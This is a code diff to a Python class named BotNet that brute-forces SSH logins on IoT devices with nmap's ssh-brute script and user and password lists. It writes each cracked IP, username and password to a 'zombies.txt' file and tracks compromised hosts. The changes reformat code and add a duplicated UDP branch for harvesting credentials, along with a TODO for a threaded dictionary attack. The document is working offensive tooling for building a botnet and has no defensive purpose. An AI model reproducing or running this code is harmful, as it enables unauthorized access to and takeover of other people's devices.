@@ -21,8 +21,8 @@ class BotNet(object):
 
     def _login(self, ip):
         zombies = self._openFile('zombies.txt', 'w')
-        self._scanner.scan(hosts=ip, ports='22',
-                           arguments='--script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt')
+        self._scanner.scan(hosts=ip, ports='22', arguments='--script ssh-brute --script-args userdb=users.txt,'
+                                                           'passdb=passwords.txt')
         if self._scanner[ip].state() == 'up':
             protocols = self._scanner[ip].all_protocols()
             if 'tcp' in protocols:
@@ -31,9 +31,20 @@ class BotNet(object):
                     data = ports['tcp'][22]['script']['ssh-brute']
                     user, password = data.replace('\n', '').split('Accounts:')[1].split('-')[0].strip().split(':')
                     zombies.write(ip + " " + user + " " + password + '\n')
-                    print(user,password, "Connected")
+                    print(user, password, "Connected")
                 except:
                     print("Not Connected")
+
+            if 'udp' in protocols:
+                ports = self._scanner[ip]
+                try:
+                    data = ports['udp'][22]['script']['ssh-brute']
+                    user, password = data.replace('\n', '').split('Accounts:')[1].split('-')[0].strip().split(':')
+                    zombies.write(ip + " " + user + " " + password + '\n')
+                    print(user, password, "Connected")
+                except:
+                    print("Not Connected")
+
         zombies.close()
 
     def findVulnerabilities(self):
@@ -59,6 +70,7 @@ class BotNet(object):
                     if 22 in ports:
                         print(ip_)
                         vulnerableIot.write(ip_ + '\n')
+                        ## TODO: Run dic attack on a separate thread
 
         iot.close()
         vulnerableIot.close()
@@ -77,6 +89,7 @@ class BotNet(object):
             for newIp in self._scanner.all_hosts():
                 self._compromisedIot.append(newIp)
                 file.write(newIp + '\n')
+                # Check for
         file.close()
 
     @staticmethod
